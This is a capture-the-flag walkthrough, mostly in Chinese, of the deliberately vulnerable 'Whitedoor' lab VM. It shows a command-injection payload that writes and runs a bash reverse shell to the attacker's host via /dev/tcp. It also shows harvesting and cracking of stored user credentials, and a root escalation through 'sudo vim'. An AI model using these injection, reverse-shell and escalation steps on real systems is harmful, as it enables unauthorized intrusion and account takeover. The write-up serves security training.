# Whitedoor

:::note

[Linux VM] [Tested on VirtualBox] created by || Pylon

⏲️ Release Date // 2023-12-15

✔️ MD5 // ceb6b1e724bb1eb201f0a1fff4b3f5d1

☠ Root // 85

💀 User // 86

📝Notes //
Enjoy it.

:::

## 靶机启动

靶机 IP：

```plaintext
192.168.56.123
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.123
Host is up (0.00051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey:
|   256 3d:85:a2:89:a9:c5:45:d0:1f:ed:3f:45:87:9d:71:a6 (ECDSA)
|_  256 07:e8:c5:28:5e:84:a7:b6:bb:d5:1d:2f:d8:92:6b:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.57 (Debian)
```

## FTP Anonymous

```plaintext title="ls -lah"
ftp> ls -lah
229 Entering Extended Passive Mode (|||33680|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        110          4096 Nov 16 22:40 .
drwxr-xr-x    2 0        110          4096 Nov 16 22:40 ..
-rw-r--r--    1 0        0              13 Nov 16 22:40 README.txt
```

```plaintext title="README.txt"
¡Good luck!
```

## web 服务

经过简单探测，发现可以实现命令执行

```plaintext title="ls;a"
blackdoor.webp
blackindex.php
index.php
whitedoor.jpg
```

尝试构建反弹 shell

```plaintext
SEND: ls;echo "bash -i >& /dev/tcp/192.168.56.102/9999 0>&1" > /tmp/shell.sh
SEND: ls /tmp
RECV: shell.sh
SEND: ls;chmod 777 /tmp/shell.sh
SEND: ls;bash /tmp/shell.sh
```

成功收到反弹的 shell

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $pwncat-cs -lp 9999
[23:40:11] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
[23:48:18] received connection from 192.168.56.123:33966                                                                                                                                              bind.py:84
[23:48:19] 192.168.56.123:33966: registered new host w/ db                                                                                                                                        manager.py:957
(local) pwncat$ back
(remote) www-data@whitedoor:/var/www/html$ whoami
www-data
```

## User - whiteshell

对用户进行探测，发现敏感凭据

```shell
(remote) www-data@whitedoor:/home/whiteshell/Desktop$ cat .my_secret_password.txt
whiteshell:VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
```

尝试进行解码

```plaintext
VkdneGMwbHpWR2d6VURSelUzZFBja1JpYkdGak5Rbz0K
Base64 decode --> VGgxc0lzVGgzUDRzU3dPckRibGFjNQo=
Base64 decode --> Th1sIsTh3P4sSwOrDblac5
```

尝试进行登录

```shell
(local) pwncat$ connect whiteshell@192.168.56.123
Password: **********************
[23:55:17] 192.168.56.123:22: normalizing shell path                                                                                                                                              manager.py:957
           192.168.56.123:22: loaded known host from db                                                                                                                                           manager.py:957
(local) pwncat$ back
(remote) whiteshell@whitedoor:/home/whiteshell$ whoami
whiteshell
```

## User - Gonzalo

对用户进行探测，发现敏感凭据

```shell
(remote) whiteshell@whitedoor:/home/Gonzalo/Desktop$ cat .my_secret_hash
$2y$10$CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj/Y48ZlAbQF6
```

尝试破解，得到

```plaintext
CqtC7h0oOG5sir4oUFxkGuKzS561UFos6F7hL31Waj --> qwertyuiop
```

尝试登陆

```shell
(local) pwncat$ connect Gonzalo@192.168.56.123
Password: **********
[00:00:14] 192.168.56.123:22: normalizing shell path                                                                                                                                              manager.py:957
[00:00:15] 192.168.56.123:22: loaded known host from db                                                                                                                                           manager.py:957
(local) pwncat$ back
(remote) Gonzalo@whitedoor:/home/Gonzalo$ whoami
Gonzalo
```

### flag - user

```shell
(remote) Gonzalo@whitedoor:/home/Gonzalo/Desktop$ cat user.txt
Y0uG3tTh3Us3RFl4g!!
```

## User - root

在 sudo 中，发现可以运行 vim

```plaintext title="sudo -l"
Matching Defaults entries for Gonzalo on whitedoor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User Gonzalo may run the following commands on whitedoor:
    (ALL : ALL) NOPASSWD: /usr/bin/vim
```

参考 [vim | GTFOBins](https://gtfobins.github.io/gtfobins/vim/)

```shell
(remote) Gonzalo@whitedoor:/home/Gonzalo/Desktop$ sudo vim -c ':!/bin/sh'

# whoami
root
```

### flag - root

```shell
# cat root.txt
Y0uAr3Th3B3sTy0Ug3Tr0oT!!
```
